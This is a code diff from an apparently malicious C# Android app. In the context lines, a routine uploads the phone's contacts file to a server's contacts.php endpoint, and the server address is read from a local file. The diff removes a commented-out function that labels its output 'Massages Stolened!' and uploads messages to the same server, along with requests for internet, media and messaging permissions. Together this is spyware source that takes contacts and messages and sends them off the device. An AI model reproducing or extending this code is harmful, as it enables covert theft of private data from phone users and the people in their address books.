@@ -28,11 +28,6 @@ namespace App1
         string serverPath = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData), "serverLoc.txt");
 
         string contactsPath = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData), "contacts.txt");
-        /*
-        string massagesPath = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData), "massages.txt");
-        string calllogsPath = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData), "calllogs.txt");
-        */
-
         // For Developement
         bool isDebugging = false;
 
@@ -128,44 +123,11 @@ namespace App1
             client.UploadFile(Server + "/contacts.php", contactsPath);
         }
 
-        // Dump Messages
-        /*
-        void DumpMassages()
-        {
-            // Make Txt file and write to it
-            using (StreamWriter sw = new StreamWriter(massagesPath))
-            {
-                sw.Write("Massages Stolened! \n---------------- Massages ------------------\n");
-
-                sw.Write("Name: " + "__ " + "Content:" + " || " + "__" + " || ");
-
-                sw.Close();
-            }
-
-            // Uplaod to Server
-            WebClient client = new WebClient();
-            client.UploadFile(Server + "/massages.php", massagesPath);
-        }
-        */
-
         // Get Permsisisons Runtime
         private void GetPermissions()
         {
             //Read Contacts
             ActivityCompat.RequestPermissions(this, new string[] { Manifest.Permission.ReadContacts.ToString() }, 0);
-            // Get Internet
-            ActivityCompat.RequestPermissions(this, new string[] { Manifest.Permission.Internet.ToString() }, 1);
-            // Get Media Control
-            ActivityCompat.RequestPermissions(this, new string[] { Manifest.Permission.MediaContentControl.ToString() }, 2);
-            // Get media Location Access
-            ActivityCompat.RequestPermissions(this, new string[] { Manifest.Permission.AccessMediaLocation.ToString() }, 3);
-
-            /*
-            // Mesages Carrier Service
-            ActivityCompat.RequestPermissions(this, new string[] { Manifest.Permission.BindCarrierMessagingClientService.ToString() }, 4);
-            //Mesages Response Service
-            ActivityCompat.RequestPermissions(this, new string[] { Manifest.Permission.SendRespondViaMessage.ToString() }, 5);
-            */
         }
     }
 }
